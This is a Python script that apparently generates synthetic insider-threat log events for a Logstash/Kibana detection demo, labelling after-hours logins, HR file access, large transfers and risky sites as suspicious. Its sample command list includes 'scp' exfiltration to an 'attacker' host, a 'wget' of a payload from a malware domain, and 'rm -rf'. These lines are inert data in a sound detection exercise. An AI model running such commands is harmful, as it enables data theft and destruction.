import time
import random
import json
import socket
import uuid
from datetime import datetime
import pwd
def get_real_users():
    users = []
    for p in pwd.getpwall():
        if p.pw_uid >= 1000 and p.pw_name != "kali":
            role = "Unknown"

            if "hr" in p.pw_name:
                role = "HR"
            elif "finance" in p.pw_name:
                role = "Finance"
            elif "it" in p.pw_name:
                role = "IT"
            elif "dev" in p.pw_name:
                role = "Developer"
            elif "intern" in p.pw_name:
                role = "Intern"
            elif "sec" in p.pw_name:
                role = "Security"

            users.append({
                "user": p.pw_name,
                "role": role
            })
    return users

HOST = "localhost"
PORT = 5044

USERS = get_real_users()

# Normal and suspicious websites
SUSPICIOUS_WEBSITES = ["mega.nz", "dropbox.com", "pastebin.com", "anonfiles.com", "darkweb.onion"]
NORMAL_WEBSITES = ["intranet.company.local", "mail.company.com", "jira.company.com", "github.com"]

# Files
FILES = [
    "/home/docs/salary.xlsx",
    "/home/docs/hr_records.pdf",
    "/home/code/app.py",
    "/home/finance/budget.xlsx",
]

# Commands
COMMANDS = [
    "ls",
    "cat file.txt",
    "chmod 777 secret.txt",
    "rm -rf /tmp",
    "scp data.zip attacker@10.0.0.9:/tmp",
    "wget http://malware.com/payload.sh",
]

# Role-based action bias
ROLE_ACTIONS = {
    "HR": ["login", "logout", "file_read", "file_write", "web_access"],
    "Finance": ["login", "logout", "file_read", "file_write", "net_conn", "web_access"],
    "IT": ["login", "logout", "cmd", "net_conn", "file_read", "web_access"],
    "Developer": ["login", "logout", "cmd", "file_read", "file_write", "web_access"],
    "Intern": ["login", "logout", "web_access", "file_read"],
    "Security": ["login", "logout", "cmd", "net_conn", "file_read", "web_access"],
}

def now_iso():
    # Kibana/Elastic-friendly timestamp
    return datetime.utcnow().isoformat() + "Z"

def pick_action(role: str) -> str:
    return random.choice(ROLE_ACTIONS.get(role, ["login", "logout", "file_read", "cmd", "net_conn", "web_access"]))

def generate_event():
    u = random.choice(USERS)
    action = pick_action(u["role"])

    event = {
        "event_id": str(uuid.uuid4()),
        "@timestamp": now_iso(),
        "user": u["user"],
        "role": u["role"],
        "action": action,
        "source_ip": f"10.0.0.{random.randint(2,254)}",
        "file": None,
        "command": None,
        "bytes_sent": None,
        "url": None,
        "is_suspicious": False,
        "suspicious_reason": None,
    }

    # Simple rules (easy to explain):
    # 1) After-hours login is suspicious
    hour = datetime.utcnow().hour
    if action == "login" and (hour < 6 or hour > 20):
        event["is_suspicious"] = True
        event["suspicious_reason"] = "after_hours_login"

    # 2) File access
    if action in ["file_read", "file_write"]:
        event["file"] = random.choice(FILES)

        # HR docs accessed by non-HR is suspicious
        if event["file"] in ["/home/docs/hr_records.pdf"] and event["role"] != "HR":
            event["is_suspicious"] = True
            event["suspicious_reason"] = "unauthorized_hr_file_access"

    # 3) Command execution
    if action == "cmd":
        event["command"] = random.choice(COMMANDS)
        if any(x in event["command"] for x in ["rm -rf", "scp", "wget"]):
            event["is_suspicious"] = True
            event["suspicious_reason"] = "dangerous_command"

    # 4) Network exfiltration
    if action == "net_conn":
        event["bytes_sent"] = random.randint(50_000, 9_000_000)
        if event["bytes_sent"] > 5_000_000:
            event["is_suspicious"] = True
            event["suspicious_reason"] = "large_exfiltration"

    # 5) Website access
    if action == "web_access":
        if random.random() < 0.35:
            event["url"] = random.choice(SUSPICIOUS_WEBSITES)
            event["is_suspicious"] = True
            event["suspicious_reason"] = "suspicious_website"
        else:
            event["url"] = random.choice(NORMAL_WEBSITES)

    return event

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print("[+] Sending logs to Logstash on port 5044")

    try:
        while True:
            event = generate_event()
            sock.sendall((json.dumps(event) + "\n").encode())
            print(event)
            time.sleep(random.uniform(0.5, 1.5))
    except KeyboardInterrupt:
        print("Stopped")
    finally:
        sock.close()

if __name__ == "__main__":
    main()

